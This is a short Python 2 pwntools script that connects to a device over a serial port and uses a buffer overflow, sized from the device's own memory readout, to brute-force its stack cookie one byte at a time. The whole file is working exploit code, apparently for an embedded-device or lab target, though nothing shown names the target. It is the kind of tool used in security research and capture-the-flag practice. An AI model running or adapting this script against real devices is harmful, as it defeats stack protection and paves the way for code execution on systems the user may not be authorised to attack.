#!/usr/bin/env python

from pwn import *
from time import sleep

def ph(d):
    return '\\x' + '\\x'.join(c.encode('hex') for c in d)

io = serialtube(port='/dev/ttyUSB0', baudrate=19200, convert_newlines=False)

while 'management' not in io.recvline():
    continue

io.sendline('2')

total_mem = int(io.recvline().split()[3])
mem_used = int(io.recvline().split()[3])

log.info('Total mem: {0}'.format(total_mem))
log.info('Mem used: {0}'.format(mem_used))

overflow = 'A' * (total_mem - mem_used - 8)

b = 0
while True:
    if b > 255:
        break
    if b == 0xa or b == 0xd:
        b = b + 1
        continue
    d = ''
    while 'management' not in d:
        d = io.readline().strip()
        print d
    io.sendline('1')
    
    d = ''
    while '0-9' not in d:
        d = io.readline().strip()
        print d

    print '\n'
    log.info('Trying byte {0}...'.format(hex(b)))
    io.send(overflow + chr(b))

    d = ''
    while 'Login' not in d:
        d += io.readline()

    print d.strip()
    if 'Stack cookie' in d:
        log.info('Stack cookie corrupted.')
        raw_input('Enter to continue')
        b = b + 1
        continue
    else:
        log.info('Possible byte: {0}'.format(hex(b)))
        overflow += chr(b)
        log.info('String is now {0}'.format(overflow))
        raw_input('Enter to continue')
        b = 0

log.info('All done here.')
